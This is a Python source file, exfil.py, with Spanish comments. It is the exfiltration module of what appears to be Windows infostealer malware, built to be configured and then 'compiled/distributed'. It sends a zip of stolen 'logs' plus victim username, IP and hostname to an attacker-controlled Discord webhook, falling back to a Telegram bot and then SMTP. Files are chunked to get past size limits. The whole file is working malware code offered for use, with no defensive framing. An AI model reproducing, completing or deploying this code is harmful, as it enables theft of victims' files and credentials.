# language: Python 3, file: exfil.py, target: Windows 10/11
# Exfil layer — envía el zip resultante via:
#   1. Discord webhook (primario)
#   2. Telegram bot (fallback)
#   3. SMTP (último recurso)
#
# Configurar las constantes antes de compilar/distribuir.

import os
import smtplib
import requests
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email import encoders
from pathlib import Path

# ─────────────────────────────────────────────
# CONFIGURACIÓN — reemplazar antes de deploy
# ─────────────────────────────────────────────

DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN"

TELEGRAM_BOT_TOKEN  = "YOUR_BOT_TOKEN"
TELEGRAM_CHAT_ID    = "YOUR_CHAT_ID"

SMTP_HOST     = "smtp.gmail.com"
SMTP_PORT     = 587
SMTP_USER     = "your_email@gmail.com"
SMTP_PASSWORD = "your_app_password"
SMTP_TO       = "receiver@example.com"

# tamaño máximo para attachment directo en Discord (MB)
DISCORD_MAX_MB = 8

# ─────────────────────────────────────────────
# DISCORD WEBHOOK
# splits el archivo si > 8 MB (límite free)
# ─────────────────────────────────────────────

def _discord_send_file(webhook_url: str, file_path: str, caption: str) -> bool:
    """
    Envía archivo via Discord webhook.
    Si > DISCORD_MAX_MB lo split en chunks y manda en múltiples mensajes.
    """
    size_mb = os.path.getsize(file_path) / (1024 * 1024)

    if size_mb <= DISCORD_MAX_MB:
        try:
            with open(file_path, 'rb') as f:
                r = requests.post(
                    webhook_url,
                    data={"content": caption},
                    files={"file": (os.path.basename(file_path), f, "application/zip")},
                    timeout=30
                )
            return r.status_code in (200, 204)
        except Exception:
            return False
    else:
        # split en partes de DISCORD_MAX_MB MB
        chunk_size = DISCORD_MAX_MB * 1024 * 1024
        part       = 0
        success    = True
        with open(file_path, 'rb') as f:
            while True:
                chunk = f.read(chunk_size)
                if not chunk:
                    break
                part += 1
                chunk_name = f"{os.path.basename(file_path)}.part{part:03d}"
                try:
                    r = requests.post(
                        webhook_url,
                        data={"content": f"{caption} — part {part}"},
                        files={"file": (chunk_name, chunk, "application/octet-stream")},
                        timeout=30
                    )
                    if r.status_code not in (200, 204):
                        success = False
                except Exception:
                    success = False
        return success


def exfil_discord(file_path: str, info_embed: dict | None = None) -> bool:
    """
    Envía el zip + embed con stats a Discord.
    info_embed: dict con campos del sistema (username, ip, etc.)
    """
    if not DISCORD_WEBHOOK_URL or "YOUR_WEBHOOK" in DISCORD_WEBHOOK_URL:
        return False

    caption = "🔔 **New log**"
    if info_embed:
        fields = "\n".join(f"**{k}**: {v}" for k, v in info_embed.items())
        caption = f"🔔 **New log**\n{fields}"

    return _discord_send_file(DISCORD_WEBHOOK_URL, file_path, caption)


# ─────────────────────────────────────────────
# TELEGRAM BOT
# split en 50 MB chunks (límite Telegram Bot API)
# ─────────────────────────────────────────────

TELEGRAM_MAX_MB = 50

def exfil_telegram(file_path: str, caption: str = "New log") -> bool:
    if not TELEGRAM_BOT_TOKEN or "YOUR_BOT" in TELEGRAM_BOT_TOKEN:
        return False

    api_base = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}"
    size_mb  = os.path.getsize(file_path) / (1024 * 1024)

    if size_mb <= TELEGRAM_MAX_MB:
        try:
            with open(file_path, 'rb') as f:
                r = requests.post(
                    f"{api_base}/sendDocument",
                    data={"chat_id": TELEGRAM_CHAT_ID, "caption": caption},
                    files={"document": (os.path.basename(file_path), f, "application/zip")},
                    timeout=60
                )
            return r.status_code == 200
        except Exception:
            return False
    else:
        # split en partes de 50 MB
        chunk_size = TELEGRAM_MAX_MB * 1024 * 1024
        part       = 0
        success    = True
        with open(file_path, 'rb') as f:
            while True:
                chunk = f.read(chunk_size)
                if not chunk:
                    break
                part += 1
                chunk_name = f"{os.path.basename(file_path)}.part{part:03d}"
                try:
                    r = requests.post(
                        f"{api_base}/sendDocument",
                        data={"chat_id": TELEGRAM_CHAT_ID, "caption": f"{caption} part {part}"},
                        files={"document": (chunk_name, chunk, "application/octet-stream")},
                        timeout=60
                    )
                    if r.status_code != 200:
                        success = False
                except Exception:
                    success = False
        return success


# ─────────────────────────────────────────────
# SMTP FALLBACK
# ─────────────────────────────────────────────

def exfil_smtp(file_path: str, subject: str = "New Log") -> bool:
    if not SMTP_USER or "your_email" in SMTP_USER:
        return False

    try:
        msg = MIMEMultipart()
        msg['From']    = SMTP_USER
        msg['To']      = SMTP_TO
        msg['Subject'] = subject

        msg.attach(MIMEText("Log attached.", 'plain'))

        with open(file_path, 'rb') as f:
            part = MIMEBase('application', 'octet-stream')
            part.set_payload(f.read())
        encoders.encode_base64(part)
        part.add_header('Content-Disposition', f'attachment; filename="{os.path.basename(file_path)}"')
        msg.attach(part)

        with smtplib.SMTP(SMTP_HOST, SMTP_PORT, timeout=30) as server:
            server.starttls()
            server.login(SMTP_USER, SMTP_PASSWORD)
            server.sendmail(SMTP_USER, SMTP_TO, msg.as_string())

        return True
    except Exception:
        return False


# ─────────────────────────────────────────────
# ENTRY POINT — intenta en cascada
# ─────────────────────────────────────────────

def Exfil(zip_path: str, system_info: dict | None = None) -> bool:
    """
    Intenta exfiltrar en orden: Discord → Telegram → SMTP.
    Retorna True si al menos uno tuvo éxito.
    """
    if not os.path.exists(zip_path):
        return False

    success = False

    if exfil_discord(zip_path, system_info):
        success = True

    if not success:
        caption = "New log"
        if system_info:
            caption += " — " + " | ".join(f"{k}: {v}" for k, v in list(system_info.items())[:4])
        if exfil_telegram(zip_path, caption):
            success = True

    if not success:
        subject = "New Log"
        if system_info:
            subject += " — " + system_info.get("hostname", "unknown")
        if exfil_smtp(zip_path, subject):
            success = True

    return success
